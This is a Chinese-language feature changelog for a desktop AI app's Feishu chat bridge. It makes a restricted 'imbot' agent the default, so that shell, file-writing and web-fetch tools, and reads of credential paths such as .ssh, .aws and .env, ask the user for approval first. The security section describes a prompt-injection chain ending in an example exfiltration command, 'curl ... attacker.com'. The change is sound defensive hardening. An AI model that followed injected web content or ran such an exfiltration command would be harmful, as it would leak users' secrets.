---
feat-id: feishu-bridge-imbot-agent
status: done
related: ./1-spec.md ./2-plan.md ./3-changelog.md
---

# feishu-bridge-imbot-agent — changelog

## 一句话

飞书桥接默认 agent `build` → `imbot`,setup hook 自动注入安全 agent,主 GUI 0 影响。

## commit 列表

| commit | 简述 |
|---|---|
| `5e81491f8` | feat(feishu-bridge): imbot 安全 agent + setup hook 注入 + 默认 saveAccount agent |
| `361913b5e` | docs(feishu-bridge-imbot-agent): 三文档 + INDEX + 改动日志 |

## 改动文件

| 文件 | 类型 | 说明 |
|---|---|---|
| `packages/desktop/src-tauri/src/feishu_plugin_install.rs` | 改 / +90 行 | `inject_imbot_agent` 函数 + `imbot_agent_spec` helper + setup hook 调用 + 5 个 unit test |
| `packages/adapter-feishu-lark/src/core/config-schema.ts` | 改 / +1 -1 | zod schema `agent.default("build")` → `agent.default("imbot")` + 注释 |
| `packages/adapter-feishu-lark/src/feishu/account-store.ts` | 改 / +2 -1 | saveAccount fallback `?? "build"` → `?? "imbot"` + 注释强调"老账号保留 build" |
| `packages/adapter-feishu-lark/src/feishu/__tests__/account-store.test.ts` | 改 / +36 行 | 2 个新 test:新绑账号默认 imbot / 老账号 build 不被强制 migrate |
| `packages/app/src/components/feishu-edit-account-dialog.tsx` | 改 / +3 -2 注释 | 注释更新指向 imbot;顺手标记 `data.default?.build` latent bug(留 FUTURE 修) |

## A. Rust setup hook(`feishu_plugin_install.rs`)

### `inject_imbot_agent(config_path)`

```rust
fn inject_imbot_agent(config_path: &Path) -> Result<(), String> {
    let raw = fs::read_to_string(config_path)?;
    let mut json: Value = serde_json::from_str(&raw).or_else(|_| {
        serde_json::from_str(&strip_comments(&raw))
    })?;

    let obj = json.as_object_mut().ok_or(...)?;
    let agent_obj = obj.entry("agent".to_string())
        .or_insert_with(|| Value::Object(Map::new()))
        .as_object_mut().ok_or(...)?;

    if agent_obj.contains_key("imbot") {
        tracing::info!("[feishu-plugin] imbot agent already in user config, skipping");
        return Ok(());  // idempotent — 完全跳过
    }

    agent_obj.insert("imbot".to_string(), imbot_agent_spec());
    fs::write(config_path, serde_json::to_string_pretty(&json)?)?;
    Ok(())
}
```

### `imbot_agent_spec()`

`serde_json::json!` 宏字面量,见 1-spec.md "范围 A" 段。**关键**:不设 `prompt` 字段 → opencode session/llm.ts:107 fallback 到 `SystemPrompt.provider(input.model)`,跟 build agent 同 system prompt。

### setup hook 调用

```rust
pub fn ensure_feishu_plugin_in_config(app: &AppHandle) {
    ...inject_plugin(&config_path, &plugin_dir)...
    // FORK: [feat: feishu-bridge-imbot-agent] 2026-05-11
    if let Err(err) = inject_imbot_agent(&config_path) {
        tracing::warn!("[feishu-plugin] imbot agent inject failed: {err}");
    }
}
```

失败仅 log 不阻断 plugin 注入(分两步,各自独立)。

## B. TS default agent: `build` → `imbot`

### `config-schema.ts:107`

```diff
- /** opencode agent 名(默认 "build" — opencode 内置主 agent,执行 tools) */
- agent: z.string().default("build"),
+ /** opencode agent 名(默认 "imbot" — DeskFox setup hook 注入的安全 agent,同 build 能力但 unattended 危险工具默认 ask)*/
+ agent: z.string().default("imbot"),
```

### `account-store.ts:139`

```diff
- // 飞书桥接默认绑 opencode "build" agent(主 agent,执行 tools);v2 加 per-account 选 agent
- agent: existing?.agent ?? "build",
+ // 飞书桥接默认绑 "imbot" agent(DeskFox setup hook 注入的安全 agent,同 build 能力但 unattended 危险工具默认 ask)
+ // 已有 account.agent(老 user 绑过 "build")保持不动 — user 自行在 edit dialog 切换
+ agent: existing?.agent ?? "imbot",
```

## C. 测试

### Rust(`cargo test --lib feishu_plugin_install::`)

| test | 验证 |
|---|---|
| `imbot_inject_into_empty_config_adds_agent_and_imbot` | 空 config inject 后 `agent.imbot.permission.bash == "ask"` + webfetch ask |
| `imbot_idempotent_when_already_present` | user 改 `agent.imbot.permission.bash` 为 allow 后第二次 inject 必须**完全跳过**,文件 mtime 不变 |
| `imbot_merges_alongside_user_other_agents` | user 已有 `agent.my_custom` 时 inject 不删 my_custom,只加 imbot |
| `imbot_handles_jsonc_with_comments` | jsonc 含行注释 + 块注释,strip_comments fallback 正常工作 |
| `imbot_read_pattern_includes_ssh_and_env` | read permission glob 列表全配:`*.env` / `**/.ssh/**` / `**/.aws/**` / `**/Library/Keychains/**` 都 ask |

5/5 ✅ 同时 9 个旧测试不破。

### TS(`bun test src/feishu/__tests__/account-store.test.ts`)

| test | 验证 |
|---|---|
| `新绑账号默认 agent = 'imbot'` | saveAccount 不带 existing → `r.account.agent === "imbot"` |
| `已绑账号(老 user agent=build)第二次 save 保留旧 agent 不动` | 先 save → 手动改 agent=build → 第二次 save,结果仍是 build(不被强制 migrate)|

16/16 全过(2 个新 + 14 个旧)。adapter feishu 总测试 262/262 全过。

### typecheck

monorepo turbo 16/16 全过。

## 用户体验改动

### 新绑账号

user 装完新 DeskFox + 第一次绑飞书账号 → 默认 agent="imbot" → 飞书消息触发 `bash` / `edit` / `write` / `apply_patch` / `webfetch` / 敏感目录 read 会弹 permission card 让 user 在飞书审批,其他工具(read 普通文件 / glob / grep / lsp / websearch / question / todowrite)**仍 allow 不打扰**。

### 老 user 已绑账号(agent=build)

**不强制 migrate** — 升级 DeskFox 后:
- 老账号 agent 字段仍是 "build"(已实测 idempotent),继续走宽权限
- 想升级到 imbot:user 自行 edit `~/.opencode/feishu-config.json` 把对应 account 的 `agent: "build"` 改成 `"imbot"` 重启 DeskFox 即生效;或删账号重绑(走默认 imbot 路径)
- **当前飞书桥接老用户极少**,不专门开 agent picker UI feat

### 主 GUI

**0 影响** — `build` agent 完全不动,user 自己用 DeskFox 主聊天窗口跟 agent 对话仍然无 confirm 摩擦。

## 安全对比

### 改前(老 user / 新 user 装老版)

| 入口 | 默认权限 | 攻击面 |
|---|---|---|
| 主 GUI | build 默认 allow | user 实时审批,permission card 弹卡能拦 |
| 飞书桥接 | build 默认 allow | ⚠️ **unattended,permission card 弹了也没人拦** |

### 改后(新 user / 新 install)

| 入口 | 默认权限 | 攻击面 |
|---|---|---|
| 主 GUI | build 默认 allow(不变) | user 实时审批,拦截可靠 |
| 飞书桥接 | imbot 默认 bash/edit/write/apply_patch/webfetch ask | ✅ **拦 prompt injection 数据 exfil 链路**:LLM 拿 webfetch 拉的恶意网页 → 试图调 bash exfil 时弹卡 → user 看到飞书卡片"确认执行 `curl ... attacker.com`?"立即拒绝 |

## 已知 trade-off

1. **imbot spec 升级不会自动覆盖**(idempotent 设计代价):future 加新敏感目录,user 不会自动拿到。可加版本号或显式 reseed flag,本笔暂不做。
2. **老账号升级路径靠手动**:user 极少,不专开 UI;edit jsonc 或重绑即可,文档已说明。
3. **第一次飞书消息试新工具(如 bash)体验**:之前 user 没意识到 bash 会被 LLM 调,改后 user 在飞书突然看到"bash 权限请求"卡片可能困惑。下次撞了再优化卡片文案。

## 回退

```sh
git revert <commit>
```

revert 后:
- Rust setup hook 不再 inject imbot,但 user opencode.jsonc 里已注入的 imbot agent **保留**(不删 — idempotent 反向不强制清)
- 新绑账号 agent 回到 "build"
- 老账号不受影响

## 影响范围 & 健康指标

- 净增代码:~120 行(Rust 90 + TS 30)
- 单测:Rust 5 + TS 2 = +7 个
- R4 override:0
- 上游侵入:0(全 fork-only,`opencode/src/` 0 行改动 — 通过 schema-level per-agent permission 实现)

## 关联

- 起源:`feishu-bridge-permission-card` 落地后的安全审计 — permission card 是被动审批,但 unattended 场景下没人 review → 必须收紧默认权限。
- 安全分析:本仓 `docs/governance/` 不写,留 changelog;详见 1-spec.md。
- FUTURE:imbot 不只飞书用 — Slack / WeChat 等 IM 桥接 future 可复用同 agent(命名 `imbot` 已支持)
